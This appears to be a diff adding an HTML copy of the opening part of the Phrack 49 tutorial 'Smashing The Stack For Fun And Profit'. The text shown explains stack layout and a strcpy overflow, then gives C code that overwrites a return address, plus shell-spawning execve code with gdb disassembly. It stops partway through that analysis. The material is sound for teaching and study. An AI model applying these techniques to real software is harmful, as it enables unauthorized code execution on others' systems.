@@ -1,0 +1,2500 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2019-05-01 Wed 03:06 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>&lrm;</title>
+<meta name="generator" content="Org mode" />
+<meta name="author" content="Sheng Li" />
+<style type="text/css">
+ <!--/*--><![CDATA[/*><!--*/
+  .title  { text-align: center;
+             margin-bottom: .2em; }
+  .subtitle { text-align: center;
+              font-size: medium;
+              font-weight: bold;
+              margin-top:0; }
+  .todo   { font-family: monospace; color: red; }
+  .done   { font-family: monospace; color: green; }
+  .priority { font-family: monospace; color: orange; }
+  .tag    { background-color: #eee; font-family: monospace;
+            padding: 2px; font-size: 80%; font-weight: normal; }
+  .timestamp { color: #bebebe; }
+  .timestamp-kwd { color: #5f9ea0; }
+  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .underline { text-decoration: underline; }
+  #postamble p, #preamble p { font-size: 90%; margin: .2em; }
+  p.verse { margin-left: 3%; }
+  pre {
+    border: 1px solid #ccc;
+    box-shadow: 3px 3px 3px #eee;
+    padding: 8pt;
+    font-family: monospace;
+    overflow: auto;
+    margin: 1.2em;
+  }
+  pre.src {
+    position: relative;
+    overflow: visible;
+    padding-top: 1.2em;
+  }
+  pre.src:before {
+    display: none;
+    position: absolute;
+    background-color: white;
+    top: -10px;
+    right: 10px;
+    padding: 3px;
+    border: 1px solid black;
+  }
+  pre.src:hover:before { display: inline;}
+  /* Languages per Org manual */
+  pre.src-asymptote:before { content: 'Asymptote'; }
+  pre.src-awk:before { content: 'Awk'; }
+  pre.src-C:before { content: 'C'; }
+  /* pre.src-C++ doesn't work in CSS */
+  pre.src-clojure:before { content: 'Clojure'; }
+  pre.src-css:before { content: 'CSS'; }
+  pre.src-D:before { content: 'D'; }
+  pre.src-ditaa:before { content: 'ditaa'; }
+  pre.src-dot:before { content: 'Graphviz'; }
+  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
+  pre.src-fortran:before { content: 'Fortran'; }
+  pre.src-gnuplot:before { content: 'gnuplot'; }
+  pre.src-haskell:before { content: 'Haskell'; }
+  pre.src-hledger:before { content: 'hledger'; }
+  pre.src-java:before { content: 'Java'; }
+  pre.src-js:before { content: 'Javascript'; }
+  pre.src-latex:before { content: 'LaTeX'; }
+  pre.src-ledger:before { content: 'Ledger'; }
+  pre.src-lisp:before { content: 'Lisp'; }
+  pre.src-lilypond:before { content: 'Lilypond'; }
+  pre.src-lua:before { content: 'Lua'; }
+  pre.src-matlab:before { content: 'MATLAB'; }
+  pre.src-mscgen:before { content: 'Mscgen'; }
+  pre.src-ocaml:before { content: 'Objective Caml'; }
+  pre.src-octave:before { content: 'Octave'; }
+  pre.src-org:before { content: 'Org mode'; }
+  pre.src-oz:before { content: 'OZ'; }
+  pre.src-plantuml:before { content: 'Plantuml'; }
+  pre.src-processing:before { content: 'Processing.js'; }
+  pre.src-python:before { content: 'Python'; }
+  pre.src-R:before { content: 'R'; }
+  pre.src-ruby:before { content: 'Ruby'; }
+  pre.src-sass:before { content: 'Sass'; }
+  pre.src-scheme:before { content: 'Scheme'; }
+  pre.src-screen:before { content: 'Gnu Screen'; }
+  pre.src-sed:before { content: 'Sed'; }
+  pre.src-sh:before { content: 'shell'; }
+  pre.src-sql:before { content: 'SQL'; }
+  pre.src-sqlite:before { content: 'SQLite'; }
+  /* additional languages in org.el's org-babel-load-languages alist */
+  pre.src-forth:before { content: 'Forth'; }
+  pre.src-io:before { content: 'IO'; }
+  pre.src-J:before { content: 'J'; }
+  pre.src-makefile:before { content: 'Makefile'; }
+  pre.src-maxima:before { content: 'Maxima'; }
+  pre.src-perl:before { content: 'Perl'; }
+  pre.src-picolisp:before { content: 'Pico Lisp'; }
+  pre.src-scala:before { content: 'Scala'; }
+  pre.src-shell:before { content: 'Shell Script'; }
+  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
+  /* additional language identifiers per "defun org-babel-execute"
+       in ob-*.el */
+  pre.src-cpp:before  { content: 'C++'; }
+  pre.src-abc:before  { content: 'ABC'; }
+  pre.src-coq:before  { content: 'Coq'; }
+  pre.src-groovy:before  { content: 'Groovy'; }
+  /* additional language identifiers from org-babel-shell-names in
+     ob-shell.el: ob-shell is the only babel language using a lambda to put
+     the execution function name together. */
+  pre.src-bash:before  { content: 'bash'; }
+  pre.src-csh:before  { content: 'csh'; }
+  pre.src-ash:before  { content: 'ash'; }
+  pre.src-dash:before  { content: 'dash'; }
+  pre.src-ksh:before  { content: 'ksh'; }
+  pre.src-mksh:before  { content: 'mksh'; }
+  pre.src-posh:before  { content: 'posh'; }
+  /* Additional Emacs modes also supported by the LaTeX listings package */
+  pre.src-ada:before { content: 'Ada'; }
+  pre.src-asm:before { content: 'Assembler'; }
+  pre.src-caml:before { content: 'Caml'; }
+  pre.src-delphi:before { content: 'Delphi'; }
+  pre.src-html:before { content: 'HTML'; }
+  pre.src-idl:before { content: 'IDL'; }
+  pre.src-mercury:before { content: 'Mercury'; }
+  pre.src-metapost:before { content: 'MetaPost'; }
+  pre.src-modula-2:before { content: 'Modula-2'; }
+  pre.src-pascal:before { content: 'Pascal'; }
+  pre.src-ps:before { content: 'PostScript'; }
+  pre.src-prolog:before { content: 'Prolog'; }
+  pre.src-simula:before { content: 'Simula'; }
+  pre.src-tcl:before { content: 'tcl'; }
+  pre.src-tex:before { content: 'TeX'; }
+  pre.src-plain-tex:before { content: 'Plain TeX'; }
+  pre.src-verilog:before { content: 'Verilog'; }
+  pre.src-vhdl:before { content: 'VHDL'; }
+  pre.src-xml:before { content: 'XML'; }
+  pre.src-nxml:before { content: 'XML'; }
+  /* add a generic configuration mode; LaTeX export needs an additional
+     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
+  pre.src-conf:before { content: 'Configuration File'; }
+
+  table { border-collapse:collapse; }
+  caption.t-above { caption-side: top; }
+  caption.t-bottom { caption-side: bottom; }
+  td, th { vertical-align:top;  }
+  th.org-right  { text-align: center;  }
+  th.org-left   { text-align: center;   }
+  th.org-center { text-align: center; }
+  td.org-right  { text-align: right;  }
+  td.org-left   { text-align: left;   }
+  td.org-center { text-align: center; }
+  dt { font-weight: bold; }
+  .footpara { display: inline; }
+  .footdef  { margin-bottom: 1em; }
+  .figure { padding: 1em; }
+  .figure p { text-align: center; }
+  .inlinetask {
+    padding: 10px;
+    border: 2px solid gray;
+    margin: 10px;
+    background: #ffffcc;
+  }
+  #org-div-home-and-up
+   { text-align: right; font-size: 70%; white-space: nowrap; }
+  textarea { overflow-x: auto; }
+  .linenr { font-size: smaller }
+  .code-highlighted { background-color: #ffff00; }
+  .org-info-js_info-navigation { border-style: none; }
+  #org-info-js_console-label
+    { font-size: 10px; font-weight: bold; white-space: nowrap; }
+  .org-info-js_search-highlight
+    { background-color: #ffff00; color: #000000; font-weight: bold; }
+  .org-svg { width: 90%; }
+  /*]]>*/-->
+</style>
+<link rel="stylesheet" 						   type="text/css" 						   href="https://shengsli.github.io/css/wheatgrass.css">
+<script type="text/javascript">
+/*
+@licstart  The following is the entire license notice for the
+JavaScript code in this tag.
+
+Copyright (C) 2012-2018 Free Software Foundation, Inc.
+
+The JavaScript code in this tag is free software: you can
+redistribute it and/or modify it under the terms of the GNU
+General Public License (GNU GPL) as published by the Free Software
+Foundation, either version 3 of the License, or (at your option)
+any later version.  The code is distributed WITHOUT ANY WARRANTY;
+without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE.  See the GNU GPL for more details.
+
+As additional permission under GNU GPL version 3 section 7, you
+may distribute non-source (e.g., minimized or compacted) forms of
+that code without the copy of the GNU GPL normally required by
+section 4, provided you include this license notice and a URL
+through which recipients can access the Corresponding Source.
+
+
+@licend  The above is the entire license notice
+for the JavaScript code in this tag.
+*/
+<!--/*--><![CDATA[/*><!--*/
+ function CodeHighlightOn(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(null != target) {
+     elem.cacheClassElem = elem.className;
+     elem.cacheClassTarget = target.className;
+     target.className = "code-highlighted";
+     elem.className   = "code-highlighted";
+   }
+ }
+ function CodeHighlightOff(elem, id)
+ {
+   var target = document.getElementById(id);
+   if(elem.cacheClassElem)
+     elem.className = elem.cacheClassElem;
+   if(elem.cacheClassTarget)
+     target.className = elem.cacheClassTarget;
+ }
+/*]]>*///-->
+</script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        displayAlign: "center",
+        displayIndent: "0em",
+
+        "HTML-CSS": { scale: 100,
+                        linebreaks: { automatic: "false" },
+                        webFont: "TeX"
+                       },
+        SVG: {scale: 100,
+              linebreaks: { automatic: "false" },
+              font: "TeX"},
+        NativeMML: {scale: 100},
+        TeX: { equationNumbers: {autoNumber: "AMS"},
+               MultLineWidth: "85%",
+               TagSide: "right",
+               TagIndent: ".8em"
+             }
+});
+</script>
+<script type="text/javascript"
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
+</head>
+<body>
+<div id="content">
+<p>
+.oO Phrack 49 Oo.
+</p>
+
+<p>
+Volume Seven, Issue Forty-Nine
+</p>
+
+<p>
+File 14 of 16
+</p>
+
+<p>
+BugTraq, r00t, and Underground.Org
+			 bring you
+</p>
+
+<p>
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Smashing The Stack For Fun And Profit
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</p>
+
+<p>
+	by Aleph One
+aleph1@underground.org
+</p>
+
+<p>
+`smash the stack` [C programming] n. On many C implementations
+it is possible to corrupt the execution stack by writing past
+the end of an array declared auto in a routine.  Code that does
+this is said to smash the stack, and can cause return from the
+routine to jump to a random address.  This can produce some of
+the most insidious data-dependent bugs known to mankind.
+Variants include trash the stack, scribble the stack, mangle
+the stack; the term mung the stack is not used, as this is
+never done intentionally. See spam; see also alias bug,
+fandango on core, memory leak, precedence lossage, overrun screw.
+</p>
+
+
+<p>
+Introduction
+<code>~~~~~~~~~~</code>
+</p>
+
+<p>
+   Over the last few months there has been a large increase of buffer
+overflow vulnerabilities being both discovered and exploited.  Examples
+of these are syslog, splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt 
+library, at, etc.  This paper attempts to explain what buffer overflows 
+are, and how their exploits work.
+</p>
+
+<p>
+   Basic knowledge of assembly is required.  An understanding of virtual 
+memory concepts, and experience with gdb are very helpful but not necessary.
+We also assume we are working with an Intel x86 CPU, and that the operating 
+system is Linux.
+</p>
+
+<p>
+   Some basic definitions before we begin: A buffer is simply a contiguous 
+block of computer memory that holds multiple instances of the same data 
+type.  C programmers normally associate with the word buffer arrays. Most 
+commonly, character arrays.  Arrays, like all variables in C, can be 
+declared either static or dynamic.  Static variables are allocated at load 
+time on the data segment.  Dynamic variables are allocated at run time on 
+the stack. To overflow is to flow, or fill over the top, brims, or bounds. 
+We will concern ourselves only with the overflow of dynamic buffers, otherwise
+known as stack-based buffer overflows.
+</p>
+
+
+<p>
+Process Memory Organization
+<code>~~~~~~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   To understand what stack buffers are we must first understand how a
+process is organized in memory.  Processes are divided into three regions:
+Text, Data, and Stack.  We will concentrate on the stack region, but first
+a small overview of the other regions is in order.
+</p>
+
+<p>
+   The text region is fixed by the program and includes code (instructions)
+and read-only data.  This region corresponds to the text section of the
+executable file.  This region is normally marked read-only and any attempt to
+write to it will result in a segmentation violation.
+</p>
+
+<p>
+   The data region contains initialized and uninitialized data.  Static
+variables are stored in this region.  The data region corresponds to the
+data-bss sections of the executable file.  Its size can be changed with the
+brk(2) system call.  If the expansion of the bss data or the user stack
+exhausts available memory, the process is blocked and is rescheduled to
+run again with a larger memory space. New memory is added between the data
+and stack segments.
+</p>
+
+<p>
+/-------------&#x2013;&#x2014;\  lower
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+
+<col  class="org-left" />
+</colgroup>
+<thead>
+<tr>
+<th scope="col" class="org-left">&#xa0;</th>
+<th scope="col" class="org-left">memory</th>
+</tr>
+
+<tr>
+<th scope="col" class="org-left">Text</th>
+<th scope="col" class="org-left">addresses</th>
+</tr>
+
+<tr>
+<th scope="col" class="org-left">&#xa0;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td class="org-left">(Initialized)</td>
+</tr>
+
+<tr>
+<td class="org-left">Data</td>
+</tr>
+
+<tr>
+<td class="org-left">(Uninitialized)</td>
+</tr>
+</tbody>
+<tbody>
+<tr>
+<td class="org-left">&#xa0;</td>
+</tr>
+
+<tr>
+<td class="org-left">Stack</td>
+<td class="org-left">higher</td>
+</tr>
+
+<tr>
+<td class="org-left">&#xa0;</td>
+<td class="org-left">memory</td>
+</tr>
+</tbody>
+</table>
+<p>
+&#x00ad;------------&#x2013;&#x2014;/  addresses
+</p>
+
+<p>
+Fig. 1 Process Memory Regions
+</p>
+
+
+<p>
+What Is A Stack?
+<code>~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   A stack is an abstract data type frequently used in computer science.  A
+stack of objects has the property that the last object placed on the stack
+will be the first object removed.  This property is commonly referred to as
+last in, first out queue, or a LIFO.
+</p>
+
+<p>
+   Several operations are defined on stacks.  Two of the most important are
+PUSH and POP.  PUSH adds an element at the top of the stack.  POP, in 
+contrast, reduces the stack size by one by removing the last element at the 
+top of the stack.
+</p>
+
+
+<p>
+Why Do We Use A Stack?
+<code>~~~~~~~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   Modern computers are designed with the need of high-level languages in
+mind.  The most important technique for structuring programs introduced by
+high-level languages is the procedure or function.  From one point of view, a
+procedure call alters the flow of control just as a jump does, but unlike a
+jump, when finished performing its task, a function returns control to the 
+statement or instruction following the call.  This high-level abstraction
+is implemented with the help of the stack.
+</p>
+
+<p>
+  The stack is also used to dynamically allocate the local variables used in
+functions, to pass parameters to the functions, and to return values from the
+function.
+</p>
+
+
+<p>
+The Stack Region
+<code>~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   A stack is a contiguous block of memory containing data.  A register called
+the stack pointer (SP) points to the top of the stack.  The bottom of the 
+stack is at a fixed address.  Its size is dynamically adjusted by the kernel 
+at run time. The CPU implements instructions to PUSH onto and POP off of the 
+stack. 
+</p>
+
+<p>
+   The stack consists of logical stack frames that are pushed when calling a
+function and popped when returning.  A stack frame contains the parameters to 
+a function, its local variables, and the data necessary to recover the 
+previous stack frame, including the value of the instruction pointer at the 
+time of the function call.
+</p>
+
+<p>
+   Depending on the implementation the stack will either grow down (towards
+lower memory addresses), or up.  In our examples we'll use a stack that grows
+down.  This is the way the stack grows on many computers including the Intel, 
+Motorola, SPARC and MIPS processors.  The stack pointer (SP) is also
+implementation dependent.  It may point to the last address on the stack, or 
+to the next free available address after the stack.  For our discussion we'll
+assume it points to the last address on the stack.
+</p>
+
+<p>
+   In addition to the stack pointer, which points to the top of the stack
+(lowest numerical address), it is often convenient to have a frame pointer
+(FP) which points to a fixed location within a frame.  Some texts also refer
+to it as a local base pointer (LB).  In principle, local variables could be
+referenced by giving their offsets from SP.  However, as words are pushed onto
+the stack and popped from the stack, these offsets change.  Although in some
+cases the compiler can keep track of the number of words on the stack and
+thus correct the offsets, in some cases it cannot, and in all cases
+considerable administration is required.  Futhermore, on some machines, such
+as Intel-based processors, accessing a variable at a known distance from SP
+requires multiple instructions.
+</p>
+
+<p>
+   Consequently, many compilers use a second register, FP, for referencing
+both local variables and parameters because their distances from FP do
+not change with PUSHes and POPs.  On Intel CPUs, BP (EBP) is used for this 
+purpose.  On the Motorola CPUs, any address register except A7 (the stack 
+pointer) will do.  Because the way our stack grows, actual parameters have 
+positive offsets and local variables have negative offsets from FP.
+</p>
+
+<p>
+   The first thing a procedure must do when called is save the previous FP
+(so it can be restored at procedure exit).  Then it copies SP into FP to 
+create the new FP, and advances SP to reserve space for the local variables. 
+This code is called the procedure prolog.  Upon procedure exit, the stack 
+must be cleaned up again, something called the procedure epilog.  The Intel 
+ENTER and LEAVE instructions and the Motorola LINK and UNLINK instructions, 
+have been provided to do most of the procedure prolog and epilog work 
+efficiently. 
+</p>
+
+<p>
+Let us see what the stack looks like in a simple example:
+</p>
+
+<p>
+example1.c:
+</p>
+<hr />
+<p>
+void function(int a, int b, int c) {
+   char buffer1[5];
+   char buffer2[10];
+}
+</p>
+
+<p>
+void main() {
+  function(1,2,3);
+}
+</p>
+<hr />
+
+<p>
+   To understand what the program does to call function() we compile it with
+gcc using the -S switch to generate assembly code output:
+</p>
+
+<p>
+$ gcc -S -o example1.s example1.c
+</p>
+
+<p>
+   By looking at the assembly language output we see that the call to
+function() is translated to:
+</p>
+
+<p>
+pushl $3
+pushl $2
+pushl $1
+call function
+</p>
+
+<p>
+    This pushes the 3 arguments to function backwards into the stack, and
+calls function().  The instruction 'call' will push the instruction pointer
+(IP) onto the stack.  We'll call the saved IP the return address (RET).  The
+first thing done in function is the procedure prolog:
+</p>
+
+<p>
+pushl %ebp
+movl %esp,%ebp
+subl $20,%esp
+</p>
+
+<p>
+   This pushes EBP, the frame pointer, onto the stack.  It then copies the
+current SP onto EBP, making it the new FP pointer.  We'll call the saved FP
+pointer SFP.  It then allocates space for the local variables by subtracting
+their size from SP.
+</p>
+
+<p>
+   We must remember that memory can only be addressed in multiples of the
+word size.  A word in our case is 4 bytes, or 32 bits.  So our 5 byte buffer
+is really going to take 8 bytes (2 words) of memory, and our 10 byte buffer
+is going to take 12 bytes (3 words) of memory.  That is why SP is being
+subtracted by 20.  With that in mind our stack looks like this when
+function() is called (each space represents a byte):
+</p>
+
+
+<p>
+bottom of                                                            top of
+memory                                                               memory
+           buffer2       buffer1   sfp   ret   a     b     c
+&lt;-&#x2013;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
+</p>
+
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+
+<p>
+Buffer Overflows
+<code>~~~~~~~~~~~~~~</code>
+</p>
+
+<p>
+   A buffer overflow is the result of stuffing more data into a buffer than
+it can handle.  How can this often found programming error can be taken
+advantage to execute arbitrary code?  Lets look at another example:
+</p>
+
+<p>
+example2.c
+</p>
+<hr />
+<p>
+void function(char *str) {
+   char buffer[16];
+</p>
+
+<p>
+   strcpy(buffer,str);
+}
+</p>
+
+<p>
+void main() {
+  char large<sub>string</sub>[256];
+  int i;
+</p>
+
+<p>
+for( i = 0; i &lt; 255; i++)
+  large<sub>string</sub>[i] = 'A';
+</p>
+
+<p>
+  function(large<sub>string</sub>);
+}
+</p>
+<hr />
+
+<p>
+   This is program has a function with a typical buffer overflow coding
+error.  The function copies a supplied string without bounds checking by
+using strcpy() instead of strncpy().  If you run this program you will get a
+segmentation violation.  Lets see what its stack looks when we call function:
+</p>
+
+
+<p>
+bottom of                                                            top of
+memory                                                               memory
+                  buffer            sfp   ret   *str
+&lt;-&#x2013;&#x2014;          [                ][    ][    ][    ]
+</p>
+
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+
+<p>
+   What is going on here?  Why do we get a segmentation violation?  Simple.
+strcpy() is coping the contents of *str (larger<sub>string</sub>[]) into buffer[]
+until a null character is found on the string.  As we can see buffer[] is
+much smaller than *str.  buffer[] is 16 bytes long, and we are trying to stuff
+it with 256 bytes.  This means that all 250 bytes after buffer in the stack
+are being overwritten.  This includes the SFP, RET, and even *str!  We had 
+filled large<sub>string</sub> with the character 'A'.  It's hex character value
+is 0x41.  That means that the return address is now 0x41414141.  This is
+outside of the process address space.  That is why when the function returns
+and tries to read the next instruction from that address you get a 
+segmentation violation.
+</p>
+
+<p>
+   So a buffer overflow allows us to change the return address of a function.
+In this way we can change the flow of execution of the program.  Lets go back
+to our first example and recall what the stack looked like:
+</p>
+
+
+<p>
+bottom of                                                            top of
+memory                                                               memory
+           buffer2       buffer1   sfp   ret   a     b     c
+&lt;-&#x2013;&#x2014;   [            ][        ][    ][    ][    ][    ][    ]
+</p>
+
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+
+<p>
+   Lets try to modify our first example so that it overwrites the return
+address, and demonstrate how we can make it execute arbitrary code.  Just
+before buffer1[] on the stack is SFP, and before it, the return address.
+That is 4 bytes pass the end of buffer1[].  But remember that buffer1[] is
+really 2 word so its 8 bytes long.  So the return address is 12 bytes from
+the start of buffer1[].  We'll modify the return value in such a way that the
+assignment statement 'x = 1;' after the function call will be jumped.  To do
+so we add 8 bytes to the return address.  Our code is now:
+</p>
+
+<p>
+example3.c:
+</p>
+<hr />
+<p>
+void function(int a, int b, int c) {
+   char buffer1[5];
+   char buffer2[10];
+   int *ret;
+</p>
+
+<p>
+   ret = buffer1 + 12;
+   (*ret) += 8;
+}
+</p>
+
+<p>
+void main() {
+  int x;
+</p>
+
+<p>
+  x = 0;
+  function(1,2,3);
+  x = 1;
+  printf("%d\n",x);
+}
+</p>
+<hr />
+
+<p>
+   What we have done is add 12 to buffer1[]'s address.  This new address is
+where the return address is stored.  We want to skip pass the assignment to
+the printf call.  How did we know to add 8 to the return address?  We used a
+test value first (for example 1), compiled the program, and then started gdb:
+</p>
+
+<hr />
+<p>
+[aleph1]$ gdb example3
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc&#x2026;
+(no debugging symbols found)&#x2026;
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000490 &lt;main&gt;:       pushl  %ebp
+0x8000491 &lt;main+1&gt;:     movl   %esp,%ebp
+0x8000493 &lt;main+3&gt;:     subl   $0x4,%esp
+0x8000496 &lt;main+6&gt;:     movl   $0x0,0xfffffffc(%ebp)
+0x800049d &lt;main+13&gt;:    pushl  $0x3
+0x800049f &lt;main+15&gt;:    pushl  $0x2
+0x80004a1 &lt;main+17&gt;:    pushl  $0x1
+0x80004a3 &lt;main+19&gt;:    call   0x8000470 &lt;function&gt;
+0x80004a8 &lt;main+24&gt;:    addl   $0xc,%esp
+0x80004ab &lt;main+27&gt;:    movl   $0x1,0xfffffffc(%ebp)
+0x80004b2 &lt;main+34&gt;:    movl   0xfffffffc(%ebp),%eax
+0x80004b5 &lt;main+37&gt;:    pushl  %eax
+0x80004b6 &lt;main+38&gt;:    pushl  $0x80004f8
+0x80004bb &lt;main+43&gt;:    call   0x8000378 &lt;printf&gt;
+0x80004c0 &lt;main+48&gt;:    addl   $0x8,%esp
+0x80004c3 &lt;main+51&gt;:    movl   %ebp,%esp
+0x80004c5 &lt;main+53&gt;:    popl   %ebp
+0x80004c6 &lt;main+54&gt;:    ret
+0x80004c7 &lt;main+55&gt;:    nop
+</p>
+<hr />
+
+<p>
+   We can see that when calling function() the RET will be 0x8004a8, and we
+want to jump past the assignment at 0x80004ab.  The next instruction we want
+to execute is the at 0x8004b2.  A little math tells us the distance is 8
+bytes.
+</p>
+
+
+<p>
+Shell Code
+<code>~~~~~~~~</code>
+</p>
+
+<p>
+   So now that we know that we can modify the return address and the flow of
+execution, what program do we want to execute?  In most cases we'll simply
+want the program to spawn a shell.  From the shell we can then issue other
+commands as we wish.  But what if there is no such code in the program we
+are trying to exploit?  How can we place arbitrary instruction into its
+address space?  The answer is to place the code with are trying to execute in
+the buffer we are overflowing, and overwrite the return address so it points
+back into the buffer.  Assuming the stack starts at address 0xFF, and that S
+stands for the code we want to execute the stack would then look like this:
+</p>
+
+
+<p>
+bottom of  DDDDDDDDEEEEEEEEEEEE  EEEE  FFFF  FFFF  FFFF  FFFF     top of
+memory     89ABCDEF0123456789AB  CDEF  0123  4567  89AB  CDEF     memory
+           buffer                sfp   ret   a     b     c
+</p>
+
+<p>
+&lt;-&#x2013;&#x2014;   [SSSSSSSSSSSSSSSSSSSS][SSSS][0xD8][0x01][0x02][0x03]
+           ^                            |
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="org-left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="org-left"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline"><span class="underline">__</span></span></span></span></span></span></span></span></span></span></span></span></span></td>
+</tr>
+</tbody>
+</table>
+<p>
+top of                                                            bottom of
+stack                                                                 stack
+</p>
+
+
+<p>
+The code to spawn a shell in C looks like:
+</p>
+
+<p>
+shellcode.c
+</p>
+<hr />
+<p>
+#include &lt;stdio.h&gt;
+</p>
+
+<p>
+void main() {
+   char *name[2];
+</p>
+
+<p>
+   name[0] = "/bin/sh";
+   name[1] = NULL;
+   execve(name[0], name, NULL);
+}
+</p>
+<hr />
+
+<p>
+   To find out what does it looks like in assembly we compile it, and start
+up gdb.  Remember to use the -static flag. Otherwise the actual code the
+for the execve system call will not be included.  Instead there will be a
+reference to dynamic C library that would normally would be linked in at
+load time.
+</p>
+
+<hr />
+<p>
+[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
+[aleph1]$ gdb shellcode
+GDB is free software and you are welcome to distribute copies of it
+ under certain conditions; type "show copying" to see the conditions.
+There is absolutely no warranty for GDB; type "show warranty" for details.
+GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc&#x2026;
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x8000130 &lt;main&gt;:       pushl  %ebp
+0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
+0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp
+0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)
+0x800013d &lt;main+13&gt;:    movl   $0x0,0xfffffffc(%ebp)
+0x8000144 &lt;main+20&gt;:    pushl  $0x0
+0x8000146 &lt;main+22&gt;:    leal   0xfffffff8(%ebp),%eax
+0x8000149 &lt;main+25&gt;:    pushl  %eax
+0x800014a &lt;main+26&gt;:    movl   0xfffffff8(%ebp),%eax
+0x800014d &lt;main+29&gt;:    pushl  %eax
+0x800014e &lt;main+30&gt;:    call   0x80002bc &lt;_<sub>execve</sub>&gt;
+0x8000153 &lt;main+35&gt;:    addl   $0xc,%esp
+0x8000156 &lt;main+38&gt;:    movl   %ebp,%esp
+0x8000158 &lt;main+40&gt;:    popl   %ebp
+0x8000159 &lt;main+41&gt;:    ret
+End of assembler dump.
+(gdb) disassemble _<sub>execve</sub>
+Dump of assembler code for function _<sub>execve</sub>:
+0x80002bc &lt;_<sub>execve</sub>&gt;:   pushl  %ebp
+0x80002bd &lt;_<sub>execve</sub>+1&gt;: movl   %esp,%ebp
+0x80002bf &lt;_<sub>execve</sub>+3&gt;: pushl  %ebx
+0x80002c0 &lt;_<sub>execve</sub>+4&gt;: movl   $0xb,%eax
+0x80002c5 &lt;_<sub>execve</sub>+9&gt;: movl   0x8(%ebp),%ebx
+0x80002c8 &lt;_<sub>execve</sub>+12&gt;:        movl   0xc(%ebp),%ecx
+0x80002cb &lt;_<sub>execve</sub>+15&gt;:        movl   0x10(%ebp),%edx
+0x80002ce &lt;_<sub>execve</sub>+18&gt;:        int    $0x80
+0x80002d0 &lt;_<sub>execve</sub>+20&gt;:        movl   %eax,%edx
+0x80002d2 &lt;_<sub>execve</sub>+22&gt;:        testl  %edx,%edx
+0x80002d4 &lt;_<sub>execve</sub>+24&gt;:        jnl    0x80002e6 &lt;_<sub>execve</sub>+42&gt;
+0x80002d6 &lt;_<sub>execve</sub>+26&gt;:        negl   %edx
+0x80002d8 &lt;_<sub>execve</sub>+28&gt;:        pushl  %edx
+0x80002d9 &lt;_<sub>execve</sub>+29&gt;:        call   0x8001a34 &lt;_<sub>normal</sub><sub>errno</sub><sub>location</sub>&gt;
+0x80002de &lt;_<sub>execve</sub>+34&gt;:        popl   %edx
+0x80002df &lt;_<sub>execve</sub>+35&gt;:        movl   %edx,(%eax)
+0x80002e1 &lt;_<sub>execve</sub>+37&gt;:        movl   $0xffffffff,%eax
+0x80002e6 &lt;_<sub>execve</sub>+42&gt;:        popl   %ebx
+0x80002e7 &lt;_<sub>execve</sub>+43&gt;:        movl   %ebp,%esp
+0x80002e9 &lt;_<sub>execve</sub>+45&gt;:        popl   %ebp
+0x80002ea &lt;_<sub>execve</sub>+46&gt;:        ret
+0x80002eb &lt;_<sub>execve</sub>+47&gt;:        nop
+End of assembler dump.
+</p>
+<hr />
+
+<p>
+Lets try to understand what is going on here. We'll start by studying main:
+</p>
+
+<hr />
+<p>
+0x8000130 &lt;main&gt;:       pushl  %ebp
+0x8000131 &lt;main+1&gt;:     movl   %esp,%ebp
+0x8000133 &lt;main+3&gt;:     subl   $0x8,%esp
+</p>
+
+<p>
+This is the procedure prelude.  It first saves the old frame pointer,
+makes the current stack pointer the new frame pointer, and leaves 
+space for the local variables. In this case its:
+</p>
+
+<p>
+char *name[2];
+</p>
+
+<p>
+or 2 pointers to a char. Pointers are a word long, so it leaves
+space for two words (8 bytes).
+</p>
+
+<p>
+0x8000136 &lt;main+6&gt;:     movl   $0x80027b8,0xfffffff8(%ebp)
+</p>
+
+<p>
